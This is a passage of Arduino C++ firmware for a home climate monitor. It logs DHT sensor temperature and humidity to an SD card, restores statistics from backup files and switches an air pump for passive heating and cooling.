    G_AlarmTimerList[l_idx].EndActioned = false;
  }

#ifdef D_2WGApp
  //Rollover the heating set
  //Force AirPump off
  for (byte l_set = 0; l_set < DC_HeatingSetCount; l_set++) {
    for (byte l_day = (DC_WeekDayCount - 1); l_day > 0; l_day--) {
      G_HeatingSet[l_set][l_day].Duration      = G_HeatingSet[l_set][l_day - 1].Duration;
      G_HeatingSet[l_set][l_day].Baseline      = G_HeatingSet[l_set][l_day - 1].Baseline;
      G_HeatingSet[l_set][l_day].Benefit       = G_HeatingSet[l_set][l_day - 1].Benefit;
      G_HeatingSet[l_set][l_day].Resource      = G_HeatingSet[l_set][l_day - 1].Resource;
      G_HeatingSet[l_set][l_day].ResourceCount = G_HeatingSet[l_set][l_day - 1].ResourceCount;
    }
    G_HeatingSet[l_set][0].Duration      = 0;
    G_HeatingSet[l_set][0].Baseline      = 0;
    G_HeatingSet[l_set][0].Benefit       = 0;
    G_HeatingSet[l_set][0].Resource      = 0;
    G_HeatingSet[l_set][0].ResourceCount = 0;
  }
#endif

  //Reset monthly statistics on the first day of every month
  int l_dd, l_mm, l_yyyy, l_hh, l_mn = 0;
  DateDecode(Date(), &l_dd, &l_mm, &l_yyyy);
  TimeDecode(Now(), &l_hh, &l_mn);
  if ((l_dd == 1) && (l_hh == 0) && (l_mn < 2))
    ResetStatisticsCounts(true); //reset month and day
  else
    ResetStatisticsCounts(false); //reset day only on other days
  //

  ResetAllWebPageNumbers(); //New web pages numbers everyday (except the functionality is disabled)

  CheckRAM();
  //WriteAlarmActionTimes();
  Pop(c_proc_num);
} //MidnightRollover

//----------------------------------------------------------------------------------------

void WriteDailyClimateRecord() {
  const byte c_proc_num = 51;
  Push(c_proc_num);
  //Write daily min and max values to our long term climate record statistical data SD card backup file

  if (!G_SDCardOK) {
    ActivityWrite(Message(M_SD_Card_Error_hy_Climate_Recording_Skipped_28));
    Pop(c_proc_num);
    return;
  }

  CheckRAM();
  int l_dd, l_mm, l_yyyy = 0;
  //Since we are just after midnight (a second or less) "Date()" returns the next day.
  //Since the next day may be 1st January we need to go back one day
  //to ensure that 31 December data is recorded in the correct HISTYYYY.TXT file
  long l_date = Date() - 100000;
  DateDecode(l_date, &l_dd, &l_mm, &l_yyyy);
  String l_SD_filename = String(EPSR(E_HIST_136) + ZeroFill(l_yyyy, 4) + ".TXT");

  SPIDeviceSelect(DC_SDCardSSPin);
  boolean l_heading = false;
  if (!SD.exists(&l_SD_filename[0]))
    l_heading = true;
  //
  File l_SD_file = SD.open(&l_SD_filename[0], FILE_WRITE);
  if (! l_SD_file) {
    ActivityWrite(String(Message(M_File_Open_Error__17) + l_SD_filename));
    SPIDeviceSelect(DC_EthernetSSPin);
    Pop(c_proc_num);
    return;
  }

  CheckRAM();
  //Write a heading line
  if (l_heading)
    l_SD_file.println(F("DATE\tSENSOR\tMAXTEMP\tMINTEMP\tMAXHUM\tMINHUM"));
  //

  //Write the detail lines for each sensor
  //Backup yeserday's daily maximum and minimum climate stats
  //These are in index 1 - since we have already done a daily rollover
  //and are using index 0 for "today's" climate stats.
  //We are just a second (or less) after midnight.
  for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
    l_SD_file.print(DateToString(l_date));
    l_SD_file.print('\t');
    l_SD_file.print(C_SensorList[l_sensor]);
    l_SD_file.print('\t');
    l_SD_file.print(TemperatureToString(C_SensorDHT11[l_sensor], G_ArrayTemp[l_sensor].TempMax[1], false));
    l_SD_file.print('\t');
    l_SD_file.print(TemperatureToString(C_SensorDHT11[l_sensor], G_ArrayTemp[l_sensor].TempMin[1], false));
    if (l_sensor < DC_SensorCountHum) {
      l_SD_file.print('\t');
      l_SD_file.print(HumidityToString(l_sensor, G_ArrayHum[l_sensor].HumMax[1]));
      l_SD_file.print('\t');
      l_SD_file.print(HumidityToString(l_sensor, G_ArrayHum[l_sensor].HumMin[1]));
    }
    l_SD_file.println();
  } //for each sensor
  CheckRAM();
  l_SD_file.close();

  SPIDeviceSelect(DC_EthernetSSPin);
  Pop(c_proc_num);
} //WriteDailyClimateRecord

//----------------------------------------------------------------------------------------

void ClimateSensorCheck() {
  const byte c_proc_num = 52;
  Push(c_proc_num);
  //We check each climate sensor once a day at midnight
  //We rely on them working to support fire detection
  //If any read error is encountered we send an email alert
  boolean l_all_ok = true;
  int l_temp, l_hum;
  //We don't extract new DHT readings until at least two seconds after any previous readings
  while (CheckSecondsDelay(G_DHTDelayTimer, C_OneSecond * 2) == false) {
  }//Do Nothing
  G_DHTDelayTimer = millis();
  for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
    if (DHTRead(l_sensor, l_temp, l_hum) != DHTLIB_OK) {
      //Could be these error code or otherwise - DHTLIB_ERROR_CHECKSUM, DHTLIB_ERROR_TIMEOUT
      l_all_ok = false;
      //The email heading is automatically written to the activity log
      //The success or failure or the email is automatically written to the activity log
      EmailInitialise(Message(M_FAULTY_CLIMATE_SENSOR_ALERT_18));
      EmailLine(EPSR(E_SENSORco__111) + C_SensorList[l_sensor]);
      EmailDisconnect();
    }
  }
  if (l_all_ok)
    ActivityWrite(Message(M_Climate_Sensor_Check_hy_All_OK_27));
  //
  CheckRAM();
  Pop(c_proc_num);
} //ClimateSensorCheck

//----------------------------------------------------------------------------------------

long CalcNextClimateCheck() {
  const byte c_proc_num = 53;
  Push(c_proc_num);
  //First extract the current time
  long l_now = Now() % 100000; //Strip off the date
  //Now calculate the current climate period (e.g. 0 .. 95 if qtr hour)
  l_now = long(float(l_now * G_Periods_Per_Day / 100000)); //truncate the fraction
  //Now calculate the next climate period update times
  l_now = l_now + 1;
  //Calculate the long minutes portion
  long l_time = long(float(l_now * 100000 / G_Periods_Per_Day));
  if (l_time != 100000)
    l_time++; //Round up 1 second to eliminate any integer truncation
  //
  CheckRAM();
  Pop(c_proc_num);
  return l_time;
} //CalcNextClimateCheck

//----------------------------------------------------------------------------------------------

int DHTRead(byte p_sensor, int & p_temperature, int & p_humidity) {
  //We return standardised values that have been multiplied by 10
  //Temperature also upshifted 35 degrees
  const byte c_proc_num = 54;
  Push(c_proc_num);
  p_temperature = 0;  //D
  p_humidity    = 0;  //D
  int l_dht_result;
  //We attempt to read the sensor three times to
  //eliminate any temporary error - seems reqd for DHT22
  byte l_count = 0;
  while (true) {
    if (l_count == 3)
      break;
    //
    if (C_SensorDHT11[p_sensor] == true)
      l_dht_result = DHT.read11(p_sensor + DC_DHT_Sensor_First_Pin);
    else
      l_dht_result = DHT.read22(p_sensor + DC_DHT_Sensor_First_Pin);
    //
    if (l_dht_result == DHTLIB_OK)
      break;
    //
    delay(2000); //DHT22 needs 1.7 secs for generate a reading
    l_count++;
  }
  if (l_dht_result == DHTLIB_OK) {
    double l_temp = DHT.temperature;
    p_temperature = int((l_temp + DC_Temp_UpShift) * 10);
    if (C_SensorTempAdjust[p_sensor] != 0) {
      p_temperature += C_SensorTempAdjust[p_sensor];
    }
    p_humidity = int(DHT.humidity * 10);
    if (C_SensorHumidityAdjust[p_sensor] != 0) {
      p_humidity += C_SensorHumidityAdjust[p_sensor];
    }
  }
  CheckRAM();
  Pop(c_proc_num);
  return l_dht_result;
} //DHTRead

//----------------------------------------------------------------------------------------

String TemperatureToString(boolean p_DHT11, int p_2wg_temp, boolean p_parentheses) {
  //The temp is a standardised value that was
  //upshifted 35 degrees and multipled by 10
  const byte c_proc_num = 55;
  Push(c_proc_num);
  if ((p_2wg_temp == 0) || (p_2wg_temp == 1000)) {
    Pop(c_proc_num);
    return EPSR(E_NULL_123);
  }
  double l_temperature;
  //Convert to real temperature
  l_temperature = (p_2wg_temp * 0.1) - DC_Temp_UpShift;
  CheckRAM();
  if ((l_temperature >= 0) || (!p_parentheses)) {
    if (p_DHT11 == true) {
      Pop(c_proc_num);
      return FormatAmt(l_temperature, 0);
    }
    else {
      Pop(c_proc_num);
      return FormatAmt(l_temperature, 1);
    }
  }
  else { //minus temp and parentheses apply
    if (p_DHT11 == true) {
      Pop(c_proc_num);
      return "(" + FormatAmt(-l_temperature, 0) + ")";
    }
    else {
      Pop(c_proc_num);
      return "(" + FormatAmt(-l_temperature, 1) + ")";
    }
  }
} //TemperatureToString

//----------------------------------------------------------------------------------------

String HumidityToString(byte p_sensor, int p_2wg_humidity) {
  const byte c_proc_num = 56;
  Push(c_proc_num);
  if ((p_2wg_humidity == 0) || (p_2wg_humidity == 1000)) {
    Pop(c_proc_num);
    return EPSR(E_NULL_123);
  }
  double l_humidity;
  l_humidity = p_2wg_humidity * 0.1;
  if (C_SensorDHT11[p_sensor] == true) { //DHT11's only have integer values
    Pop(c_proc_num);
    return FormatAmt(l_humidity, 0);
  }
  else {//DHT22 humidity has one decimal point accuracy
    Pop(c_proc_num);
    return FormatAmt(l_humidity, 1);
  }
} //HumidityToString

//----------------------------------------------------------------------------------------

boolean LoadRecentMemoryBackupFile() {
  const byte c_proc_num = 57;
  Push(c_proc_num);
  //After Climate Arrays have been initialised (nulled)
  //After call to CalcNextClimateCheck()
  //After manual reload of UDPNTP Time

  /*
    30MN Left Temp 22 22 22 23 23 23 23 23 24 24 24 24
    30MN Left Humidity 62 62 62 60 60 60 60 59 59 59 59 59
    30MN Right Temp 21 22 22 22 22 22 23 23 23 23 23 23
    30MN Right Humidity 60 60 60 60 60 59 58 58 58 58 58 58
    DAY Left Temp Max NULL NULL NULL NULL NULL 24 24
    DAY Left Temp Min NULL NULL NULL NULL NULL 22 20
    DAY Left Humidity Max NULL NULL NULL NULL NULL 67 62
    DAY Left Humidity Min NULL NULL NULL NULL NULL 58 59
    DAY Right Temp Max NULL NULL NULL NULL NULL 23 23
    DAY Right Temp Min NULL NULL NULL NULL NULL 22 20
    DAY Right Humidity Max NULL NULL NULL NULL NULL 61 60
    DAY Right Humidity Min NULL NULL NULL NULL NULL 57 57
    AIRPUMP 22 22 22 23 23 23 23 23 24 24 24 24
  */


  if (!G_SDCardOK) {
    Pop(c_proc_num);
    return false;
  }

  SPIDeviceSelect(DC_SDCardSSPin);

  int l_yyyy, l_mm, l_dd, l_hh, l_mn = 0; //l_ss
  String l_SD_filename = "";

  long l_PeriodTime   = 0;
  int  l_PeriodOffset = 0;
  boolean l_SD_file_found = false;
  //Look back up to 24 climate periods for the most recent backup file
  //We may be loading a forward backup because of a recent forced backup
  //before an application restart.
  for (byte l_count = 0; l_count < 24 ; l_count++) {
    l_PeriodTime = Date() + G_NextClimateUpdateTime - long(100000 * l_count / G_Periods_Per_Day) + 1; //fraction adjusted
    DateDecode(l_PeriodTime, &l_dd, &l_mm, &l_yyyy);
    TimeDecode(l_PeriodTime, &l_hh, &l_mn);
    String l_directory = String(EPSR(E_BACKUPSsl_135) + ZeroFill(l_yyyy, 4) + "/" + ZeroFill(l_mm, 2) + "/" + ZeroFill(l_dd, 2) );
    SD.mkdir(&l_directory[0]);
    l_SD_filename = String(l_directory + "/" + ZeroFill(l_mm, 2) + ZeroFill(l_dd, 2) + ZeroFill(l_hh, 2) + ZeroFill(l_mn, 2) + ".txt");
    //BACKUPS/2013/11/10/11101800.txt
    if (SD.exists(&l_SD_filename[0])) {
      TwoWayCommsSPICSC2(EPSR(E_Reload__290) + l_SD_filename);
      l_SD_file_found = true;
      break;
    }
    //array data wise the fwd (first) hour is the same as the immediately previous hour.
    //After that we begin offsetting the periods.
    if (l_count != 0)
      l_PeriodOffset += 1;
    //
  }
  CheckRAM();
  if (!l_SD_file_found)	{
    SPIDeviceSelect(DC_EthernetSSPin);
    Pop(c_proc_num);
    return false;
  }

  int l_DayOffset = 0;
  //If the date of the backup file we will load is yesterday
  //we need to offset (7) DAY climate data by one day.
  if (l_PeriodTime < Date()) //Date() is midnight 12:00am - the start of today
    l_DayOffset = 1;
  //

  //We have found the most recent backup and have offsets for missed data
  //BACKUPS/2013/11/10/11101800.TXT
  //Serial.println(l_SD_filename);
  File l_SD_file = SD.open(&l_SD_filename[0], FILE_READ);
  CheckRAM();
  if (! l_SD_file) {
    ActivityWrite(String(Message(M_Could_not_open_file__20) + l_SD_filename)); //Should not happen - we know it exists
    SPIDeviceSelect(DC_EthernetSSPin);
    Pop(c_proc_num);
    return false;
  }

  int* l_row; //An int array pointer
  String l_reqd_stattype = DetermineStatType(G_Periods_Per_Day);
  while (l_SD_file.available() != 0) {
    //Hopefully the relatively small size of the files and consistent
    //line length will minimise any String memory fragmentation
    String l_line = l_SD_file.readStringUntil('\n');
    if (l_line == "") //no blank lines are anticipated
      break;
    //
    //Serial.println(l_line);
    //30MN Right Humidity 60 60 60 60 60 59 58 58 58 58 58 58
    //DAY Left Temp Max NULL NULL NULL NULL NULL 24 24
    //AIRPUMP 22 22 22 23 23 23 23 23 24 24 24 24

    int l_posn = 0;
    String l_stattype = ENDF2(l_line, l_posn, '\t');
#ifdef D_2WGApp
    if (l_stattype == EPSR(E_AIRPUMP_291)) {
      int l_index1  = DC_ClimatePeriodCount - 1;
      int l_Offset = l_PeriodOffset;
      for (byte l_count2 = 1; l_count2 <= DC_ClimatePeriodCount; l_count2++) { //twelve
        String l_value = ENDF2(l_line, l_posn, '\t');
        if (l_value == "") //If index not back to zero we have gaps in the recovered data
          //because we could not load the most recent backup file.
          break; //we have finished
        //
        if (l_Offset == 0) {	//We can load this value
          if (l_value != EPSR(E_NULL_123))
            G_AirPumpModes[l_index1] = l_value.toInt();
          else
            G_AirPumpModes[l_index1] = 0;
          //
          l_index1--;
        }
        else //We discard end value(s) because we only have an old backup (not the most recent)
          l_Offset--; //By skipping index values we will leave null gaps in the data in the lower array index values
        //
        if (l_index1 < 0)
          break;
        //
      } //for each array element
    }
#endif
    if (l_stattype == "STAT") {
      int l_index = ENDF2(l_line, l_posn, '\t').toInt();
      unsigned int l_count = ENDF2(l_line, l_posn, '\t').toInt();
      G_StatActvMth[l_index] = l_count;
      if (l_posn != -1) {
        l_count = ENDF2(l_line, l_posn, '\t').toInt();
        G_StatActvDay[l_index] = l_count;
      }
      else
        G_StatActvDay[l_index] = 0;
      //
    } //STAT

    else if (l_stattype == "CRWL") {
      //To cater for the deletion and reordering of the G_WebCrawlers table we
      //lookup the crawler name from the final field on each line and index accordingly
      String l_temp = ENDF2(l_line, l_posn, '\t'); //discard previous index
      unsigned int l_mth = ENDF2(l_line, l_posn, '\t').toInt();
      unsigned int l_day = ENDF2(l_line, l_posn, '\t').toInt();
      String l_crawler   = ENDF2(l_line, l_posn, '\t');
      l_crawler.trim();
      //Serial.println(l_crawler);
      boolean l_crawler_found = false;
      int l_crwl;
      for (l_crwl = 0; l_crwl < G_CrawlerCount; l_crwl++) {
        if (G_WebCrawlers[l_crwl] == l_crawler) {
          l_crawler_found = true;
          break;
        }
      }
      if (l_crawler_found) {
        G_StatCrwlMth[l_crwl] = l_mth;
        G_StatCrwlDay[l_crwl] = l_day;
      }
      //else
      //  Serial.println(F("False"));
      //
    } //CRWL

    else if (l_stattype == "IP") {
      //IP 0 219 88 69 69 PGE 03/01/2015 09:45:06 1
      //IP 1 183 60 48 25 PXY 03/01/2015 10:01:26 5
      //IP 2 85 60 176 162 PHP 03/01/2015 10:16:01 4
      //IP 3 66 249 73 210 HTM 03/01/2015 10:21:07 1
      //IP 4 0 0 0 0 0 0 0
      //IP 5 0 0 0 0 0 0 0

      //IP 0 219 88 69 69 PGE 03/01/2015 12:03:34 1
      //Serial.println(l_line);
      int l_index = ENDF2(l_line, l_posn, '\t').toInt();

      G_FailedHTMLRequestList[l_index].IPAddress[0] = ENDF2(l_line, l_posn, '\t').toInt();
      G_FailedHTMLRequestList[l_index].IPAddress[1] = ENDF2(l_line, l_posn, '\t').toInt();
      G_FailedHTMLRequestList[l_index].IPAddress[2] = ENDF2(l_line, l_posn, '\t').toInt();
      G_FailedHTMLRequestList[l_index].IPAddress[3] = ENDF2(l_line, l_posn, '\t').toInt();

      ENDF2(l_line, l_posn, '\t').toCharArray(G_FailedHTMLRequestList[l_index].BanType, 4); //+1 for \0

      String l_string = ENDF2(l_line, l_posn, '\t'); //The Date
      if (l_string != "0") {
        //Extract date elements
        int l_dd, l_mm, l_yyyy, l_hh, l_mn, l_ss, l_posn2 = 0;
        l_dd   = ENDF2(l_string, l_posn2, '/').toInt();
        l_mm   = ENDF2(l_string, l_posn2, '/').toInt();
        l_yyyy = ENDF2(l_string, l_posn2, '/').toInt();

        //Extract time elements
        l_string =  ENDF2(l_line, l_posn, '\t'); //The Time
        l_posn2 = 0;
        l_hh = ENDF2(l_string, l_posn2, ':').toInt();
        l_mn = ENDF2(l_string, l_posn2, ':').toInt();
        l_ss = ENDF2(l_string, l_posn2, ':').toInt();

        //Initialise time first
        long l_time = (long(l_hh) * 3600) + (l_mn * 60) + l_ss; //Calc seconds first
        l_time = long(float(l_time) / 24 / 60 / 60 * 100000); //Convert to a system time value
        G_FailedHTMLRequestList[l_index].LastDateTime = long(l_time + 1);
        //Add the day
        G_FailedHTMLRequestList[l_index].LastDateTime += DateEncode(l_dd, l_mm, l_yyyy);
      }
      else
        G_FailedHTMLRequestList[l_index].LastDateTime = 0;
      //
      G_FailedHTMLRequestList[l_index].AttemptCount = ENDF2(l_line, l_posn, '\t').toInt();
    } //IP
    else if ((l_stattype == EPSR(E_HEATING_324)) || (l_stattype == EPSR(E_COOLING_325))) {
      int l_set;
      if (l_stattype == EPSR(E_HEATING_324))
        l_set = 0;
      else
        l_set = 1;
      //
      String l_field = ENDF2(l_line, l_posn, '\t'); //
      if (l_field == EPSRU(E_Duration_317)) {
        for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
          G_HeatingSet[l_set][l_day].Duration = ENDF2(l_line, l_posn, '\t').toInt();
        }
      }
      else if (l_field == EPSRU(E_Resource_318)) {
        for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
          G_HeatingSet[l_set][l_day].Resource = ENDF2(l_line, l_posn, '\t').toInt();
        }
      }
      else if (l_field == String(EPSRU(E_Resource_318) + "COUNT")) {
        for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
          G_HeatingSet[l_set][l_day].ResourceCount = ENDF2(l_line, l_posn, '\t').toInt();
        }
      }
      else if (l_field == EPSRU(E_Baseline_323)) {
        for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
          G_HeatingSet[l_set][l_day].Baseline = ENDF2(l_line, l_posn, '\t').toInt();
        }
      }
      else if (l_field == EPSRU(E_Benefit_319)) {
        for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
          G_HeatingSet[l_set][l_day].Benefit = ENDF2(l_line, l_posn, '\t').toInt();
        }
      }
    } //HEATING or COOLING
    else { //Everything else (climate sensors)
      String l_sensor   = ENDF2(l_line, l_posn, '\t');
      String l_stat     = ENDF2(l_line, l_posn, '\t');
      int l_sensor_index = 0; //scoped for later use
      boolean l_sensor_found = false;
      for (l_sensor_index = 0; l_sensor_index < DC_SensorCountTemp; l_sensor_index++) {
        if (C_SensorList[l_sensor_index] == l_sensor) {
          l_sensor_found = true;
          break;
        }
        //
      } //find the sensor
      if (l_sensor_found) { //skip removed sensors
        if (l_reqd_stattype == l_stattype) {
          //This is a periodic data set
          int l_ValueOffset = 0;
          if (l_stat == EPSR(E_Temp_145)) {
            l_row = G_ArrayTemp[l_sensor_index].TempPeriodic;
            l_ValueOffset = DC_Temp_UpShift;
          }
          else if (l_sensor_index < DC_SensorCountHum) //Humidity
            l_row = G_ArrayHum[l_sensor_index].HumPeriodic;
          //

          if ((l_stat == EPSR(E_Temp_145)) || (l_sensor_index < DC_SensorCountHum)) {
            int l_index1  = DC_ClimatePeriodCount - 1;
            int l_Offset = l_PeriodOffset;
            for (byte l_count2 = 1; l_count2 <= DC_ClimatePeriodCount; l_count2++) { //twelve
              String l_value = ENDF2(l_line, l_posn, '\t');
              if (l_value == "") //If index not back to zero we have gaps in the recovered data
                //because we could not load the most recent backup file.
                break; //we have finished
              //
              if (l_Offset == 0) {	//We can load this value
                if (l_value != EPSR(E_NULL_123))
                  l_row[l_index1] = int((StringToDouble(l_value) + l_ValueOffset) * 10);
                else
                  l_row[l_index1] = 0;
                //
                l_index1--;
              }
              else //We discard end value(s) because we only have an old backup (not the most recent)
                l_Offset--; //By skipping index values we will leave null gaps in the data in the lower array index values
              //
              if (l_index1 < 0)
                break;
              //
            } //for each array element
          } //skip humidity statistics not now required
        } //periodic stat type
        else if (l_stattype == "DAY") {
          String l_sub_stat = ENDF2(l_line, l_posn, '\t');	//Min or Max
          //This is a day min/max data set
          int l_ValueOffset = 0;
          l_row = NULL;
          if ((l_stat == EPSR(E_Temp_145)) && (l_sub_stat == "Max")) {
            l_row = G_ArrayTemp[l_sensor_index].TempMax;
            l_ValueOffset = DC_Temp_UpShift;
          }
          else if ((l_stat == EPSR(E_Temp_145)) && (l_sub_stat == "Min")) {
            l_row = G_ArrayTemp[l_sensor_index].TempMin;
            l_ValueOffset = DC_Temp_UpShift;
          }
          else if ((l_stat == EPSR(E_Humidity_73)) && (l_sub_stat == "Max")) {
            if (l_sensor_index  < DC_SensorCountHum)
              l_row = G_ArrayHum[l_sensor_index].HumMax;
          }
          else { //if ((l_stat == "Humidity") && (l_sub_stat == "Min"))
            if (l_sensor_index  < DC_SensorCountHum)
              l_row = G_ArrayHum[l_sensor_index].HumMin;
          }
          //
          if ((l_stat == EPSR(E_Temp_145)) || (l_sensor_index < DC_SensorCountHum)) {
            int l_index2 = DC_WeekDayCount - 1;
            int l_Offset = l_DayOffset;
            for (byte l_count3 = 1; l_count3 <= DC_WeekDayCount; l_count3++) { //7 days
              String l_value = ENDF2(l_line, l_posn, '\t');
              if (l_value == "")
                break; //we have finished
              //
              if (l_Offset == 0) {
                if (l_value != EPSR(E_NULL_123))
                  l_row[l_index2] = int((StringToDouble(l_value) + l_ValueOffset) * 10);
                else
                  l_row[l_index2] = 0;
                //
                l_index2--;
              }
              else
                l_Offset--;
              //
              if (l_index2 < 0)
                break;
              //
            } //Load each day of the week
          } //skip humidity statistics not now required
        } //Determine what type of statistic (Periodic or DAY)
      } //Skip removed sensors
    } //Climate Sensors
  } //EOF

  CheckRAM();
  l_SD_file.close();

  SPIDeviceSelect(DC_EthernetSSPin);

  Pop(c_proc_num);
  return true;
} //LoadRecentMemoryBackupFile

//----------------------------------------------------------------------------------------

#ifdef D_2WGApp
void HeatResourceCheck() {
  //We check every one minute if we
  //need to enable the fan because of an available heat resource
  const float C_CutoverPoint = 4.0;
  const byte c_proc_num = 58;
  Push(c_proc_num);

  G_AirPumpTimer = millis(); //Don't come back for one minute

  //FanTime is a five minute fan timer. We use it to prevent rapid on/off fan switching when the
  //heat resource, hallway temperature or humidity are fluctuating around their cut off points.
  //In a worst case scenario with fluctuating data inputs, the fan will switch on and off at a
  //minimum of five minute intervals.

  //We also use a one degree tolerance for off switching.
  //For heating we start >= 4C, but we don't switch off until less than 3C

  //We will also need a fan switch option on the web page to force the fan on and off immediately.
  //This would also reset the five minute fan timer.

  //If both heat and cool mode is disabled there is nothing to do.
  //The fan is controlled manually in this case.
  if ((G_HeatMode == false) && (G_CoolMode == false)) {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }

  boolean l_fan_enable = false; //Default OFF
  int l_heat_res;
  int l_hallway_temp;
  int l_outside_temp;
  int l_outside_hum;
  boolean l_heat_mode;
  if (!CalculateHeatResource(l_heat_res, l_hallway_temp, l_outside_temp, l_outside_hum)) {
    //We get back standardised values which are multiplied by 10 (temp also uplifted 35 degrees)
    //For the heat resource difference no 35 degree downshift reqd
    //Do nothing if we cannot extract the heat resource
    if (G_AirPumpEnabled)
      SwitchAirPump(); //Force OFF
    //
    Pop(c_proc_num);
    return;
  }
  if (l_heat_res > 0)
    l_heat_mode = true;
  else
    l_heat_mode = false;
  //

  double l_heat_res_d      = l_heat_res * 0.1;
  double l_hallway_temp_d  = (l_hallway_temp * 0.1) - DC_Temp_UpShift;
  double l_outside_temp_d  = (l_outside_temp * 0.1) - DC_Temp_UpShift;
  double l_outside_hum_d   = l_outside_hum * 0.1;

  int l_hour, l_min;
  TimeDecode(Now(), &l_hour, &l_min);

  //The two tests are mutually exclusive. One operates only for a positive heat resource. The
  //other operates only for a -ve heat resource. Neither operate between -3 and +3 heat resources.

  //After 10:00am and as soon as a heat resource is available we start heating the house to
  //build up thermal mass reserves for the evening and minimise use of gas & electric heating.
  if ((G_HeatMode) &&
      ((l_heat_res_d >= C_CutoverPoint) || // >= 4C
       ((G_AirPumpEnabled) && (l_heat_res_d >= (C_CutoverPoint - 1.0)))) && // >= 3C
      (l_hallway_temp_d < 26)  &&
      (GetUPSBatteryVoltage() > 12.5) &&
      (l_hour >= 10)) { // 10:00AM
    l_heat_mode = true;
    l_fan_enable = true; //ON
  }
  //Above will switch off when
  //- heating is disabled
  //- heat resource drops below 3C (maybe 8/9PM)
  //- hallway temp gets to 28C
  //- Time goes past midnight (unlikely)
  //- And the five minute timer has elapsed

  //Between 2:00am and 10:00am we cool the house in summer to reduce thermal mass reserves before daytime
  //reheating commences. Don't bother if it is raining because the temperature rise during
  //the morning will not occur.
  if ((G_CoolMode) &&
      ((l_heat_res_d <= -C_CutoverPoint) || // <= -4C
       ((G_AirPumpEnabled) && (l_heat_res_d <= (-C_CutoverPoint + 1.0)))) && // <= -3C
      (l_hallway_temp_d > 21) &&
      (l_hour >= 2)        && //>= 05:00AM
      (l_hour < 10)        && //< 10:00AM
      (GetUPSBatteryVoltage() > 12.5) &&
      (l_outside_hum_d < 80)) { //80%
    l_heat_mode = false;
    l_fan_enable = true;
  }
  //Above will switch off when
  //- cooling is disabled
  //- cooling resource rises above -3C (maybe 8/9AM)
  //- hallway temp drops below 21C
  //- Humidity rises above 80%
  //- Time goes past 10:00am
  //- And the five minute timer has elapsed

  if (l_fan_enable != G_AirPumpEnabled) {
    SwitchAirPump(); //ON or OFF
  }

  CheckRAM();
  Pop(c_proc_num);
} //HeatResourceCheck
#endif

//--------------------------------------------------------------------------------------

#ifdef D_2WGApp
void SwitchAirPump() {
  //Switch the fan enable flag - Enable or disable
  //Called for two web page links - to turn on or Off
  //Also called HeatResourceCheck that is called by
  //loop() every one minute
  const byte c_proc_num = 59;
  Push(c_proc_num);

  if (!CaptureHeatingsStats(!G_AirPumpEnabled)) {
    //If for some reasons we cannot capture the heating stats
    //Force fan OFF
    ActivityWrite(EPSR(E_ERROR_CaptureHeatingsStats_322));
    ActivityWrite(EPSR(E_Air_Pump_Switched_Off_32));
    digitalWrite(G_AirPumpPin, HIGH); //Relay and its LED OFF
    return;
  }

  G_AirPumpEnabled = !G_AirPumpEnabled;
  if (G_AirPumpEnabled == false) {
    ActivityWrite(EPSR(E_Air_Pump_Switched_Off_32));
    digitalWrite(G_AirPumpPin, HIGH); //Relay and its LED OFF
    G_AirPumpTimer = 0; //Check pump operation every one minute
    //G_AirPumpOn = false;
  }
  else {
    ActivityWrite(EPSR(E_Air_Pump_Switched_On_31));
    digitalWrite(G_AirPumpPin, LOW); //Relay and its LED ON
    G_AirPumpTimer = millis(); //Check pump operation every one minute
  }
  CheckRAM();
  Pop(c_proc_num);
} //SwitchAirPump
#endif

//----------------------------------------------------------------------------------------

#ifdef D_2WGApp
boolean CaptureHeatingsStats(boolean p_on) {
  //Capture heating stats - we add (or substract) them from our array
  //We capture time and temperature stats.
  const byte c_proc_num = 123;
  Push(c_proc_num);
  int l_heat_res;
  int l_front_door_temp;
  int l_outside_temp;
  int l_outside_hum;
  if (!CalculateHeatResource(l_heat_res, l_front_door_temp, l_outside_temp, l_outside_hum)) {
    //We get back standardised values which are multiplied by 10 (temp also uplifted 35 degrees)
    //For the heat resource difference no 35 degree downshift reqd
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }
  int l_hallway_temp;
  int l_hallway_hum;
  DHTRead(C_Hallway_Sensor, l_hallway_temp, l_hallway_hum);

  int l_set;
  if (l_heat_res > 0)
    l_set = DC_HEAT;
  else
    l_set = DC_COOL;
  //

  G_HeatingSet[l_set][0].Resource += (l_heat_res + 350); //Force back to standard Ardy values
  G_HeatingSet[l_set][0].ResourceCount++;
  if (p_on) {
    G_HeatingSet[l_set][0].Duration -= Time();
    G_HeatingSet[l_set][0].Baseline -= l_hallway_temp;
    G_HeatingSet[l_set][0].Benefit  -= l_front_door_temp;
  }
  else {//Off
    G_HeatingSet[l_set][0].Duration += Time();
    G_HeatingSet[l_set][0].Baseline += l_hallway_temp;
    G_HeatingSet[l_set][0].Benefit  += l_front_door_temp; //Temp difference not standardised
  }
  CheckRAM();
  Pop(c_proc_num);
  return true;
} //CaptureHeatingsStats
#endif

//----------------------------------------------------------------------------------------

#ifdef D_2WGApp
boolean CalculateHeatResource(int &p_heat_res, int &p_front_door_temp, int &p_outside_temp, int &p_outside_hum) {
  //We will return standardised values which are multiplied by 10
  //Temperatures are also uplifted 35 degrees.
  //For the heat resource difference no 35 degree downshift reqd
  const byte c_proc_num = 60;
  Push(c_proc_num);
  int l_temp = 0;
  int l_hum = 0;

  //We don't extract new DHT readings until at least two seconds after any previous readings
  while (CheckSecondsDelay(G_DHTDelayTimer, C_OneSecond * 2) == false) {
    ;
  }//Do Nothing
  G_DHTDelayTimer = millis();

  p_heat_res = 0;
  p_front_door_temp = 0;
  p_outside_temp = 0;
  p_outside_temp = 0;
  int l_dht_result = DHTRead(C_RoofSpace_Sensor, l_temp, l_hum);
  if (l_dht_result == DHTLIB_OK) {
    p_heat_res = l_temp;
    l_dht_result = DHTRead(C_Front_Door_Sensor, l_temp, l_hum);
    if (l_dht_result == DHTLIB_OK) {
      p_heat_res = p_heat_res - l_temp; //350 = 35 degree upshift times 10
      p_front_door_temp = l_temp;
      l_dht_result = DHTRead(C_Outdoor_Sensor, l_temp, l_hum);
      if (l_dht_result == DHTLIB_OK) {
        p_outside_temp = l_temp;
